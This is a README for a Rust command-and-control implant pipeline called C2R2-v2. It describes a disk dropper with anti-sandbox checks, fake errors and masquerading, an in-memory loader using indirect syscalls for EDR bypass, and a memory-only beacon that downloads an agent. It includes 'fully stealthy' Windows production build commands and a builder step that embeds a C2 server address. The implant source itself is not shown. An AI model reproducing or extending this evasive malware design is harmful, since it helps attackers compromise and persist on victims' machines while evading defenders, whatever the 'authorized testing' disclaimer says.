# C2R2-v2 Multi-Stage Execution Pipeline

This directory contains the multi-stage execution pipeline for C2R2-v2, inspired by IRIS C2.

## Directory Structure

```
stages/
├── ester/          # Stage 1: Entry/Dropper
│   ├── src/
│   │   ├── main.rs           # Entry point
│   │   ├── config.rs         # Embedded payload configuration
│   │   ├── evasion.rs        # Environment validation checks
│   │   └── stage_trigger.rs  # Stage 2 trigger logic
│   ├── Cargo.toml
│   └── build.rs              # Windows resource configuration
│
├── javelin/        # Stage 2: In-Memory Loader
│   ├── src/
│   │   ├── lib.rs            # Library interface
│   │   ├── main.rs           # Standalone binary (testing)
│   │   ├── crypto.rs         # XOR/AES decryption
│   │   ├── memory.rs         # Memory allocation & management
│   │   └── loader.rs         # Stage 3 loading logic
│   └── Cargo.toml
│
└── stage0/         # Stage 3: Bootstrap Payload
    ├── src/
    │   ├── lib.rs            # Library interface
    │   ├── main.rs           # Standalone binary (testing)
    │   ├── config.rs         # C2 server configuration
    │   ├── beacon.rs         # Initial beacon functionality
    │   ├── network.rs        # TLS session management
    │   └── download.rs       # Agent download logic
    └── Cargo.toml
```

## Quick Start

### Build All Stages (Development)

```bash
# From workspace root
cargo build -p ester -p javelin -p stage0
```

### Build All Stages (Production)

```bash
# Cross-compile for Windows with production features
cargo build --release --target x86_64-pc-windows-gnu \
    --no-default-features --features production \
    -p ester -p javelin -p stage0
```

### Test Individual Stages

```bash
# Test ESTER
cargo run -p ester

# Test JAVELIN
cargo run -p javelin

# Test Stage0
cargo run -p stage0
```

## Stage Overview

### Stage 1: ESTER
- **Purpose**: Initial dropper with environment validation
- **Runs on**: Disk (unavoidable entry point)
- **C2 Communication**: None
- **Key Features**: Anti-sandbox, legitimacy checks, triggers Stage 2

### Stage 2: JAVELIN
- **Purpose**: In-memory loader with decryption
- **Runs on**: Memory only
- **C2 Communication**: None
- **Key Features**: XOR/AES decryption, RW→RX transitions, memory cleanup

### Stage 3: Stage0
- **Purpose**: Bootstrap payload for agent download
- **Runs on**: Memory only
- **C2 Communication**: Yes (TLS encrypted)
- **Key Features**: Initial beacon, session establishment, agent download

## Features

### Development vs Production Modes

**Development Mode** (default):
- Console window shown
- Debug prints enabled
- Environment checks skipped (ESTER)
- Useful for testing and debugging

**Production Mode** (`--features production`):
- No console window
- No debug output
- Full anti-sandbox checks enabled
- Fully stealthy operation

### Build Modes

```bash
# Development build (with console and debug output)
cargo build -p ester

# Production build (no console, no debug, stealthy)
cargo build --release --target x86_64-pc-windows-gnu \
    --no-default-features --features production -p ester
```

## Integration with Builder

The builder tool (`builder/`) can be extended to generate complete staged payloads:

```bash
# Future functionality (not yet implemented)
./builder build-staged \
    --name my-staged-agent \
    --server 192.168.1.10:4444 \
    --production
```

This would:
1. Build Stage0 with C2 address
2. Encrypt Stage0 and embed in JAVELIN
3. Encrypt JAVELIN and embed in ESTER
4. Output complete staged payload

## OPSEC Considerations

### What Runs Where

| Stage | Disk | Memory | Network |
|-------|------|--------|---------|
| ESTER | Yes | - | No |
| JAVELIN | No | Yes | No |
| Stage0 | No | Yes | Yes (TLS) |
| Full Agent | No | Yes | Yes (TLS) |

### Detection Surface

**ESTER (Disk)**:
- Small binary (~50KB)
- Can masquerade as legitimate software
- No C2 addresses or suspicious strings
- Anti-sandbox checks (can trigger alerts)

**JAVELIN (Memory)**:
- VirtualAlloc/VirtualProtect calls
- RW → RX memory transitions
- Memory zeroing after use

**Stage0 (Memory + Network)**:
- TLS encrypted traffic
- Single beacon + download
- Position-independent code

## Dependencies

### Common Dependencies
- `obfstr` - String obfuscation
- `rand` - Random number generation

### Stage-Specific Dependencies

**ESTER**:
- `winapi` - Windows API access

**JAVELIN**:
- `winapi` - Memory management
- `dinvk` - Indirect syscalls (EDR bypass)
- `base64` - Encoding/decoding

**Stage0**:
- `rustls` - TLS 1.2/1.3 support
- `webpki-roots` - Root certificates
- `winapi` - Windows API access

## Security Features

### ESTER
- ✅ CPU core count check (2+)
- ✅ Physical memory check (4GB+)
- ✅ Debugger detection
- ✅ System uptime check (10+ minutes)
- ✅ Fake error messages on failure

### JAVELIN
- ✅ XOR encryption (fast, small)
- ✅ AES-256-GCM support (optional)
- ✅ RW → RX memory transitions
- ✅ Secure memory zeroing
- ✅ Indirect syscalls via dinvk

### Stage0
- ✅ TLS 1.2/1.3 encryption
- ✅ Position-independent code
- ✅ Connection retry with backoff
- ✅ Size validation on downloads
- ✅ Memory-only execution

## Testing

### Unit Tests

Each stage includes unit tests:

```bash
# Run all stage tests
cargo test -p ester -p javelin -p stage0

# Run specific stage tests
cargo test -p ester
cargo test -p javelin
cargo test -p stage0
```

### Integration Testing

Test the complete staging flow:

```bash
# 1. Start C2 server
cd c2r2-server
./target/release/c2r2-server --bind 0.0.0.0 --port 4444

# 2. Build stages in dev mode
cargo build -p ester -p javelin -p stage0

# 3. Run ESTER (will trigger all stages)
./target/debug/ester
```

## Troubleshooting

### Build Errors

**Missing winres dependency**:
```bash
# ESTER build.rs requires winres
cargo add winres --build -p ester
```

**Cross-compilation issues**:
```bash
# Ensure Windows target is installed
rustup target add x86_64-pc-windows-gnu

# Ensure MinGW is installed (Linux)
sudo apt install mingw-w64
```

### Runtime Errors

**ESTER exits immediately**:
- In production mode, environment checks may fail
- Build with dev mode for testing: `cargo build -p ester`

**JAVELIN fails to load Stage0**:
- No embedded payload (expected in current implementation)
- Builder integration needed to embed Stage0

**Stage0 connection fails**:
- Verify C2 server is running
- Check firewall rules
- Verify C2_SERVER address in config.rs

## Documentation

For detailed documentation, see:
- [STAGING.md](../docs/STAGING.md) - Complete staging system documentation
- [ARCHITECTURE.md](../docs/ARCHITECTURE.md) - System architecture
- [DEVELOPMENT.md](../docs/DEVELOPMENT.md) - Development guide

## Contributing

When contributing to the staging system:

1. Maintain separation of concerns between stages
2. Keep ESTER minimal and generic
3. Avoid C2 logic duplication in early stages
4. Document OPSEC trade-offs for new features
5. Add unit tests for new functionality

## License

Same as C2R2-v2 main project (MIT License).

## Legal Disclaimer

⚠️ **FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY**

This staging system is provided for security researchers and penetration testers. Unauthorized use is illegal. Always obtain written permission before deployment.

---

**Version**: 2.0.0  
**Last Updated**: 2024-01-18
